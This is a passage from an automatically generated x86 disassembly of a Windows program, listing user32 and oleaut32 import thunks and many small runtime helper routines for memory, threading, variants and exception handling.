jmp [ __import_lookup_table_9(user32:PostQuitMessage) ]
PtInRect
jmp [ __import_lookup_table_9(user32:PtInRect) ]
RedrawWindow
jmp [ __import_lookup_table_9(user32:RedrawWindow) ]
RegisterClassA
jmp [ RegisterClassA@IAT ]
RegisterClipboardFormatA
jmp [ RegisterClipboardFormatA@IAT ]
ReleaseCapture
jmp [ __import_lookup_table_9(user32:ReleaseCapture) ]
ReleaseDC
jmp [ ReleaseDC@IAT ]
RemoveMenu
jmp [ __import_lookup_table_9(user32:RemoveMenu) ]
ScrollWindow
jmp [ __import_lookup_table_9(user32:ScrollWindow) ]
SetActiveWindow
jmp [ __import_lookup_table_9(user32:SetActiveWindow) ]
SetCapture
jmp [ __import_lookup_table_9(user32:SetCapture) ]
SetClassLongA
jmp [ __import_lookup_table_9(user32:SetClassLongA) ]
SetForegroundWindow
jmp [ SetForegroundWindow@IAT ]
SetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:SetMenuItemInfoA) ]
SetParent
jmp [ __import_lookup_table_9(user32:SetParent) ]
SetTimer
jmp [ SetTimer@IAT ]
SetWindowPlacement
jmp [ __import_lookup_table_9(user32:SetWindowPlacement) ]
SetWindowsHookExA
jmp [ __import_lookup_table_9(user32:SetWindowsHookExA) ]
ShowCursor
jmp [ __import_lookup_table_9(user32:ShowCursor) ]
ShowOwnedPopups
jmp [ __import_lookup_table_9(user32:ShowOwnedPopups) ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ UnhookWindowsHookEx@IAT ]
UnregisterClassA
jmp [ UnregisterClassA@IAT ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ WaitMessage@IAT ]
WinHelpA
jmp [ __import_lookup_table_9(user32:WinHelpA) ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
sub_4067d4
call GetTickCount
retn
sub_4067dc
xor eax eax
retn
sub_4067e0
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_4067f0
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_40680c
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_406820
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_406858
call sub_4067c8
retn
CreateWindowExA
jmp [ CreateWindowExA@IAT ]
sub_406a35
jmp sub_403858
sub_406a3c
pop ebp
retn
sub_406a40
sub [ rw-data ] 0x1
retn
sub_406a6d
jmp sub_403858
sub_406a74
pop ebp
retn
sub_406a78
sub [ rw-data ] 0x1
retn
sub_406d8d
jmp sub_403858
sub_406d94
pop ebp
retn
sub_406d98
sub [ rw-data ] 0x1
retn
sub_40786d
add eax 0xffffffd4
jmp sub_40ceb8
sub_407875
add eax 0xffffffd4
jmp sub_40cf54
sub_407887
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4055c8
sub_407891
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4055dc
sub_407968
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
call sub_403890
pop ebx
retn
sub_407c40
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_407c08
test eax eax
sete al
pop esi
pop ebx
retn
sub_40819e
jmp sub_403858
sub_4081a5
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4081ac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_408138
pop esi
pop ebx
retn
sub_40823c
call sub_408218
retn
sub_4082d4
push eax
call CloseHandle
retn
sub_408344
push ebx
mov ebx eax
mov eax ebx
call sub_4082dc
inc eax
setne al
pop ebx
retn
sub_40851c
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_408530
push esi
mov esi eax
xchg edx eax
call sub_4028b8
mov eax esi
pop esi
retn
sub_4086f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_40404c
pop esi
pop ebx
retn
sub_408704
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4026bc
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_408718
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_408750
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_4026dc
sub_4087b8
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402818
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_4087dc
push ebx
mov ebx eax
mov eax ebx
call sub_403e54
pop ebx
retn
sub_408b3f
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_403e54
pop eax
pop ebx
retn
sub_408df7
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_408f52
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_4092af
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_4092af
sub_40936c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404314
mov edx esi
xor ecx ecx
call sub_4091f8
pop esi
pop ebx
retn
sub_4093e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404314
mov edx esi
mov cl 0x1
call sub_4091f8
pop esi
pop ebx
retn
sub_409b1a
jmp sub_403858
sub_409b21
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409c12
jmp sub_403858
sub_409c19
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a3bd
jmp sub_403858
sub_40a3c4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a44c
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a3f0
pop ebp
retn 0x8
sub_40a591
jmp sub_403858
sub_40a598
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40aa3b
jmp sub_403858
sub_40aa42
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40af27
jmp sub_403858
sub_40af2e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40afd9
jmp sub_403858
sub_40afe0
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40b083
jmp sub_403858
sub_40b08a
pop esi
pop ecx
pop ebp
retn
sub_40b266
jmp sub_403858
sub_40b26d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b2c4
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40b5b6
jmp sub_403858
sub_40b684
jmp sub_403858
sub_40b6ac
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_4030b8
sub_40b7a8
pop ebx
retn
sub_40b848
jmp sub_403858
sub_40b84f
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b858
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_403890
sub_40b865
retn
sub_40b868
push ebp
mov ebp esp
call sub_40b7ac
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40b858
pop ebp
retn 0x4
sub_40b884
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
call sub_403890
retn
sub_40b91c
push ebx
mov ebx eax
mov eax ebx
call sub_40b89c
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40baef
jmp sub_403858
sub_40baf6
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bbbb
jmp sub_403858
sub_40bbc2
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40bbcc
call sub_40b458
mov eax 0x1
call sub_403e3c
sub_40bd50
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40be29
jmp sub_403858
sub_40be46
jmp sub_403858
sub_40be4d
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40bef8
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40be5c
mov ecx eax
sub_40c0e4
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40c104
push eax
call CharNextA
retn
sub_40c46c
jmp sub_403858
sub_40c473
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c4dc
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40c933
jmp sub_403858
sub_40c93a
pop ebx
mov esp ebp
pop ebp
retn
sub_40cb03
jmp sub_403858
sub_40cb0a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
Sleep
jmp [ Sleep@IAT ]
sub_40cbac
jmp sub_403858
sub_40cbb3
pop ebx
mov esp ebp
pop ebp
retn
sub_40cbb8
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40cb1c
sub_40cbc8
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40cbe4
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_4026dc
pop ebx
retn
sub_40cc6c
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40cc78
xchg [ eax ] edx
mov eax edx
retn
sub_40ccd8
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40cd68
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40ce80
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40cea8
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40d123
jmp sub_403858
sub_40d12a
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40d198
jmp sub_403858
sub_40d19f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d1bd
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40d1b6
jmp sub_403858
sub_40d1bd
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40d60d
jmp sub_403858
sub_40d614
pop ebp
retn
sub_40d680
jmp sub_403858
sub_40d687
pop ebp
retn
VariantInit
jmp [ VariantInit@IAT ]
VariantChangeType
jmp [ VariantChangeType@IAT ]
sub_40d700
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40d766
jmp sub_403858
sub_40d76d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d7d2
jmp sub_403858
sub_40d7d9
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d83e
jmp sub_403858
sub_40d845
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d8aa
jmp sub_403858
sub_40d8b1
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d916
jmp sub_403858
sub_40d91d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d995
jmp sub_403858
sub_40d99c
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40da08
jmp sub_403858
sub_40da0f
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40da78
jmp sub_403858
sub_40da7f
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40daec
jmp sub_403858
sub_40daf3
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ SafeArrayCreate@IAT ]
SafeArrayGetLBound
jmp [ SafeArrayGetLBound@IAT ]
SafeArrayGetUBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetUBound) ]
sub_40de79
jmp sub_403858
sub_40de80
pop ebp
retn
sub_40de84
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40db48
sub_40de95
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40e4b6
jmp sub_403858
sub_40e4bd
pop ecx
pop ebp
retn
sub_40e54f
jmp sub_403858
sub_40e556
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e5a6
jmp sub_403858
sub_40e5ad
pop ecx
pop ebp
retn
sub_40e63f
jmp sub_403858
sub_40e646
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e696
jmp sub_403858
sub_40e69d
pop ecx
pop ebp
retn
sub_40e8e5
jmp sub_403858
sub_40e8ec
pop ebx
mov esp ebp
pop ebp
retn
sub_40e97e
jmp sub_403858
sub_40e985
pop ecx
pop ebp
retn
sub_40e988
push ebx
mov ebx eax
mov eax ebx
call sub_40ec20
mov [ ebx ] 0x1
pop ebx
retn
sub_40ec20
test [ eax ] 0xbfe8
jne r-xdata
call sub_40eba4
retn
mov [ eax ] 0x0
retn
sub_40ec34
push eax
call sub_40ec20
pop eax
retn
sub_40ee94
call sub_40ef48
retn
sub_40f0b2
jmp sub_403858
sub_40f0b9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f15d
jmp sub_403858
sub_40f164
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f186
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40454c
retn
sub_40f17f
jmp sub_403858
sub_40f186
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f1e2
jmp sub_403858
sub_40f1e9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f265
jmp sub_403858
sub_40f7ab
jmp sub_403858
sub_40f7b2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f845
jmp sub_403858
sub_40f84c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f869
lea eax [ ebp - 0x14 ]
call sub_404534
retn
sub_40f862
jmp sub_403858
sub_40f869
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f8c6
jmp sub_403858
sub_40f8cd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f96f
jmp sub_403858
sub_40f98c
jmp sub_403858
sub_40f993
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40feee
jmp sub_403858
sub_40fef5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ffa0
push eax
call sub_40ec20
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_40ffb4
push eax
call sub_40ec20
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_41002c
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40ef48
add esp 0x10
sub_4102d6
jmp sub_403858
sub_4102dd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_410320
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40ec20
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_410338
mov edx 0x80020004
call sub_410320
retn
sub_4103c9
jmp sub_403858
sub_4103d0
pop esi
pop ebx
pop ebp
retn
sub_4103d4
push ebp
mov ebp esp
call sub_410594
pop ebp
retn 0x4
sub_410460
push ebp
mov ebp esp
call sub_410594
pop ebp
retn 0x4
sub_410543
jmp sub_403858
sub_41054a
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_4030f4
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403478
sub_41056c
xor eax eax
retn
sub_410570
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_410584
mov [ ecx ] 0x8
mov al 0x1
retn
sub_41058c
call sub_40e46c
retn
sub_410594
call sub_40e55c
retn
sub_41059c
call sub_40e934
retn
sub_4105a4
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_4105b8
call sub_410594
retn
sub_4105c0
push ebp
mov ebp esp
call sub_41059c
pop ebp
retn 0x8
sub_4105d8
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_4106b4
jmp sub_403858
sub_41077d
jmp sub_403858
sub_410784
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4107a1
lea eax [ ebp - 0x10 ]
call sub_403e54
retn
sub_41079a
jmp sub_403858
sub_4107a1
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4107ac
call sub_40e988
retn
sub_410823
jmp sub_403858
sub_41082a
pop ebp
retn
sub_4108cd
jmp sub_403858
sub_4108d4
pop ebp
retn
sub_4109e5
jmp sub_403858
sub_4109ec
pop ebp
retn
sub_4109f0
sub [ rw-data ] 0x1
retn
sub_410a24
xor edx edx
mov dl [ eax + 0x1 ]
lea eax [ eax + edx + 0x2 ]
retn
sub_410ca8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_403ea8
pop esi
pop ebx
retn
sub_410d44
jmp sub_403858
sub_410d4b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_410e46
jmp sub_403858
sub_410e4d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41104c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40ef48
pop esi
pop ebx
retn
sub_4111ce
jmp sub_403858
sub_4111d5
pop ebp
retn
sub_4111d8
sub [ rw-data ] 0x1
retn
sub_411205
jmp sub_403858
sub_41120c
pop ebp
retn
sub_411210
sub [ rw-data ] 0x1
retn
sub_412205
add [ esp + 0x4 ] 0xffffffec
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x8 ]
sub_4125a7
add [ esp + 0x4 ] 0xffffffd8
jmp sub_41a024
sub_4125b1
add [ esp + 0x4 ] 0xffffffd8
jmp sub_41a044
sub_4125bb
add [ esp + 0x4 ] 0xffffffd4
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_412928
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_412a4c
mov eax [ eax + 0xc ]
call sub_413c10
retn
sub_412d23
jmp sub_403858
sub_412d2a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412d30
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_413dc8
test eax eax
setge al
pop esi
pop ebx
retn
sub_413033
jmp sub_403858
sub_41303a
mov esp ebp
pop ebp
retn
sub_413108
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_413114
push ebx
mov ebx edx
mov edx ebx
call sub_412f28
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_412c88
sub_4131c0
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41331b
jmp sub_403858
sub_4133ef
jmp sub_403858
sub_413400
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_41346c
jmp sub_403858
sub_413473
pop ebx
mov esp ebp
pop ebp
retn
sub_4134be
jmp sub_403858
sub_4134c5
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_413551
jmp sub_403858
sub_413558
pop ebx
pop ebp
retn
sub_41359e
jmp sub_403858
sub_4135a5
pop ebx
pop ebp
retn
sub_4135ea
jmp sub_403858
sub_4135f1
pop ebx
pop ebp
retn
sub_41363b
jmp sub_403858
sub_413642
pop esi
pop ebx
pop ebp
retn
sub_413696
jmp sub_403858
sub_41369d
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_4137ca
jmp sub_403858
sub_4138a0
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_413eb0
sub_413990
jmp sub_403858
sub_413b1a
jmp sub_403858
sub_413b21
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413bbb
jmp sub_403858
sub_413bc2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413be1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_413bda
jmp sub_403858
sub_413be1
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_413c44
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_413f0c
xor edx edx
mov eax ebx
call sub_413ed0
pop ebx
retn
sub_413cbc
mov eax [ ebp + 0x4 ]
retn
sub_413cf2
pop ecx
pop edx
pop esi
pop ebx
retn
sub_413d40
jmp sub_403858
sub_413d47
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413d4c
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_413d64
xor edx edx
call sub_413d6c
retn
sub_413e54
mov edx [ eax + 0x8 ]
dec edx
call sub_413d6c
retn
sub_413f7c
retn
sub_414036
jmp sub_403858
sub_41403d
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403478
sub_4140cc
jmp sub_403858
sub_4140d3
pop ebx
pop ecx
pop ebp
retn
sub_4140d8
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_41412f
jmp sub_403858
sub_414136
pop ebx
pop ecx
pop ebp
retn
sub_41413c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_414178
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
call sub_403890
retn
sub_414190
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_41426b
retn
sub_41426c
cmp edx [ eax + 0x4 ]
jae sub_414178
mov eax [ eax + 0x8 ]
bt [ eax ] edx
sbb eax eax
and eax 0x1
retn
sub_414328
test edx edx
je r-xdata
xor edx edx
call sub_41433c
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_4143f2
jmp sub_403858
sub_4143f9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41440c
xchg edx eax
call sub_41433c
retn
sub_414414
retn
sub_4144ad
jmp sub_403858
sub_4144b4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4145fe
jmp sub_403858
sub_41470e
jmp sub_403858
sub_414715
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414732
lea eax [ ebp - 0xc ]
call sub_403e54
retn
sub_41472b
jmp sub_403858
sub_414732
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4147bc
jmp sub_403858
sub_4147d4
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_414890
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_414939
jmp sub_403858
sub_414940
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41494c
mov eax [ ebp + 0x4 ]
retn
sub_414982
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4149d0
jmp sub_403858
sub_4149d7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414a96
jmp sub_403858
sub_414a9d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414abf
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403e78
retn
sub_414ab8
jmp sub_403858
sub_414abf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414ac8
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_414ad0
xor eax eax
retn
sub_414b19
jmp sub_403858
sub_414b20
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_414c33
jmp sub_403858
sub_414c3a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414cc8
jmp sub_403858
sub_414ccf
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414d9f
jmp sub_403858
sub_414da6
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414e5c
jmp sub_403858
sub_414e63
pop esi
pop ecx
pop ebp
retn
sub_414ee8
jmp sub_403858
sub_414eef
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414f0c
lea eax [ ebp - 0x8 ]
call sub_403e54
retn
sub_414f05
jmp sub_403858
sub_414f0c
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414f98
jmp sub_403858
sub_414fb5
jmp sub_403858
sub_414fbc
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414ff8
retn
sub_41507b
jmp sub_403858
sub_415082
mov eax [ ebp - 0x8 ]
call sub_417cec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4150a7
lea eax [ ebp - 0xc ]
call sub_403e54
retn
sub_4150a0
jmp sub_403858
sub_4150a7
mov esp ebp
pop ebp
retn
sub_4150f7
jmp sub_403858
sub_4150fe
pop esi
pop ecx
pop ebp
retn
sub_415151
jmp sub_403858
sub_415158
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_415160
retn
sub_4151db
jmp sub_403858
sub_4151e2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41527f
jmp sub_403858
sub_415286
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4152a3
lea eax [ ebp - 0x8 ]
call sub_403e54
retn
sub_41529c
jmp sub_403858
sub_4152a3
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4152a8
retn
sub_415322
jmp sub_403858
sub_415329
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415330
mov eax edx
mov edx ecx
call sub_407c08
retn
sub_41533c
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_415354
sub_4153cc
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_41543c
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_415458
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41564c
mov eax [ eax + 0x18 ]
retn
sub_415650
mov eax [ eax + 0x14 ]
retn
sub_4156ec
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_4158f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_4026fc
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_415934
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_41594c
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_415960
mov edx sub_41594c
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_4159a8
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_407c08
retn
mov eax edx
mov edx ecx
call sub_407bd0
retn
sub_415a44
retn
